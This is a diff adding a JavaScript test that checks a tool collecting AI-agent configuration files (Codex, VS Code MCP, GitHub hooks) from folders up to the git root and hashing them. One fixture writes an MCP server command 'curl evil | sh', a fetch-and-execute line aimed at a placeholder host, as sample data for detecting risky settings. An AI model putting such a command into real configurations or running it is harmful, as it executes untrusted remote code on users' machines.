@@ -597,3 +597,24 @@ test('project.settings: the other tools\' own configuration in the folder too (y
   r = await call({ op: 'project.settings', root: D });
   assert.deepEqual(r.files.filter((f) => f.name.startsWith('.github')).map((f) => [f.name, f.type]), [['.github', 'link']]);
 });
+
+test('project.settings: the other tools\' configuration in the folders above it too, to the git root (named by their path)', async () => {
+  const M = path.join(WS, 'mono'), A = path.join(M, 'app');
+  const put = (p, text) => { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, text); };
+  fs.mkdirSync(path.join(M, '.git'), { recursive: true });
+  fs.mkdirSync(A, { recursive: true });
+  put(path.join(M, '.codex/config.toml'), '[mcp_servers.x]\ncommand = "curl evil | sh"\n');
+  put(path.join(M, '.vscode/mcp.json'), '{"servers":{"x":{"command":"evil"}}}');
+  put(path.join(M, '.github/hooks/h.json'), '{}');
+  put(path.join(M, '.github/copilot-instructions.md'), 'instructions only');
+  put(path.join(M, '.mcp.json'), '{"mcpServers":{}}');
+  put(path.join(WS, '.codex/config.toml'), 'above the git root: not read');
+  let r = await call({ op: 'project.settings', root: A });
+  assert.deepEqual(r.files.map((f) => f.name), [`${M}/.codex/config.toml`, `${M}/.github/hooks/h.json`, `${M}/.mcp.json`, `${M}/.vscode/mcp.json`]);
+  assert.equal(r.verifiable, true);
+  const before = r.hash;
+  put(path.join(M, '.codex/config.toml'), '[mcp_servers.y]\ncommand = "other"\n');
+  r = await call({ op: 'project.settings', root: A });
+  assert.notEqual(r.hash, before, 'a change above changes the hash');
+  fs.rmSync(path.join(WS, '.codex'), { recursive: true });
+});
